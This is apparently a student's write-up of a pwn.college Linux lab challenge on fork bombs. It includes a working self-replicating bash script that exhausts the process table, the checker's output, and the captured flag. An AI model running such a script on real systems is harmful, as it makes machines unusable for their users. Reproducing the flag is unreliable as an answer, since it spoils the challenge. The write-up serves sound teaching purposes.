# Linux Luminarium
# Module 15: Daring Destruction

## The Fork Bomb
As you learned in the Processes and Jobs module, whenever you start a program the Linux operating system creates a new process. If you create processes faster than the kernel can handle, the process table fills up and everything grinds to a halt. This new process (e.g., of an ls invocation) is "forked" off of a parent process (e.g., a shell instance). Thus, the induced explosion of processes is called a "Fork Bomb".

You have the tools to do this:

write a small script (like in the Chaining Commands module)
make it executable (like in the Perceiving Permissions module)
make it launch a copy of itself in the background (like in the Processes and Jobs module)
and then launch another copy of itself in the background!
Each copy will launch two more, and each of those will launch two more, and you will flood the system with so many processes that new ones will not be able to start!

This challenge contains a /challenge/check that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so. Make sure to launch it (in a different terminal) before launching your attack; otherwise you won't be able to launch it!

NOTE: Needless to say, this will render your environment unusable. Just restart the challenge (or start a different one) to get things back to a usable state!

### Solve
**Flag:** `pwn.college{E-OgQsOo-gl3giHeM4qk5KJrxVg.0VMyEzNxwiNyUDN0EzW}`

This challenge demonstrated a fork bomb by recursively spawning copies of the same script in the background. The script launched two new instances of itself using &, causing exponential process growth. Once enough processes were created, the system could no longer spawn new ones, and /challenge/check detected the exhausted process table and revealed the flag.

```bash
hacker@destruction~the-fork-bomb:~$ nano bomb.sh
(#!/bin/bash
./bomb.sh &
./bomb.sh &)
hacker@destruction~the-fork-bomb:~$ chmod +x bomb.sh
hacker@destruction~the-fork-bomb:~$ ./bomb.sh

hacker@destruction~the-fork-bomb:~$ /challenge/check
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
You successfully saturated the process table.  Here is your hard-earned flag:
pwn.college{E-OgQsOo-gl3giHeM4qk5KJrxVg.0VMyEzNxwiNyUDN0EzW}
```

### New Learnings
Learned how a fork bomb works by recursively creating processes faster than the operating system can manage them. Reinforced the concept that every program execution creates a process and that system resources include not only disk space and memory but also available process slots. Also gained practical experience using background execution (&) and observing the effects of process exhaustion through fork failures and system slowdowns.